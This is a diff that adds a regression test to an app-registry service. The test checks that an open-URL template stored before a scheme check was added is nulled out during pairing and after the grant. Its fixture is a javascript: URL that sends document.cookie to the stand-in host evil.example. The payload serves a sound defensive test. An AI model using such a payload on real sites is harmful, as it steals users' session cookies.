@@ -358,6 +358,26 @@ it.layer(NodeServices.layer)("AppRegistryService", (it) => {
     }).pipe(Effect.provide(layer));
   });
 
+  it.effect("serves no open URL from a registration stored before the scheme check", () => {
+    const { layer } = makeLayer();
+    return Effect.gen(function* () {
+      const registry = yield* AppRegistryService;
+      // Only the HTTP route decodes registrations, so this writes what an older server stored.
+      const created = yield* registry.createPairingRequest({
+        ...registration,
+        openUrlTemplate: "javascript:fetch('//evil.example?'+document.cookie)",
+      });
+      const asking = Option.getOrThrow(yield* registry.get(registration.appId)).status;
+      assert.isNull(asking.openUrlTemplate);
+      assert.isUndefined(asking.pendingRequest?.registration.openUrlTemplate);
+
+      yield* registry.decidePairing({ requestId: created.requestId, decision: "grant" });
+      const granted = Option.getOrThrow(yield* registry.get(registration.appId)).status;
+      assert.strictEqual(granted.state, "granted");
+      assert.isNull(granted.openUrlTemplate);
+    }).pipe(Effect.provide(layer));
+  });
+
   it.effect("lets a denied app ask again", () => {
     const { layer } = makeLayer();
     return Effect.gen(function* () {
